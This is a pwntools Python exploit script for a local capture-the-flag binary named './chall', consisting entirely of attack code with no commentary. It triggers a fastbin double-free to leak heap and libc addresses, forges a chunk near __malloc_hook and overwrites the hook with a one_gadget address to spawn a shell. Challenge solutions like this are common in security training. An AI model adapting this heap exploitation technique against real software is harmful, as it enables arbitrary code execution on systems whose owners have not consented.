from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(c):
	cmd(1)
	p.sendlineafter(": ",str(c))
def free(idx):
	cmd(3)
	p.sendlineafter("id:",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
p=process("./chall")
libc=ELF("./chall").libc
#base=int(p.readline()[:-1],16)-libc.symbols['setbuf']

add(p64(0x91)*12)
add(p64(0x91)*12)
free(1)
free(0)
free(1)
show(0)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x70
log.warning(hex(heap))

add(p64(0x6020ad-0x10))
add("A")
add("A")
add('\x00'*3+p64(0)*2+p64(0x000000000602018))
show(0)
libc=ELF("./chall").libc
base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.symbols['free']
log.warning(hex(base))
free(2)
free(3)
free(2)
libc.address=base
add(p64(libc.symbols['__malloc_hook']-35))
add(p64(libc.symbols['__malloc_hook']-35))
add(p64(libc.symbols['__malloc_hook']-35))
one=0xf02a4
add('\x00'*19+p64(one+base))
free(2)
free(2)
gdb.attach(p)
p.interactive()
